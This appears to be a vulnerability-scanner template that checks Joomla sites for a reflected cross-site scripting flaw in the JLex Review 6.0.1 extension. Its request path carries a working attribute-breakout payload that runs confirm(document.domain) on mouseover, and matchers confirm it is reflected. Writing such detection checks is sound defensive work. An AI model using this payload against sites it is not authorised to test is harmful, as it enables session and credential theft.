id: "joomla-jlex-xss"
name: "Joomla JLex Review 6.0.1 - Cross-Site Scripting"
severity: "medium"
description: "The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials."
tech:
  - "generic"
tags:
  - "joomla"
  - "xss"
  - "vuln"
reference: "https://www.exploitalert.com/view-details.html?id=39732"
spaExclusion: true
request:
  method: "GET"
  path: "/?review_id=1&itwed%22onmouseover=%22confirm(document.domain)%22style=%22position:absolute%3bwidth:100%25%3bheight:100%25%3btop:0%3bleft:0%3b%22b7yzn=1"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "<a href=\"/?itwed\"onmouseover=\"confirm(document.domain)\"style="
      - "jlex-review"
    condition: "and"
  - type: "status"
    status:
      - 200
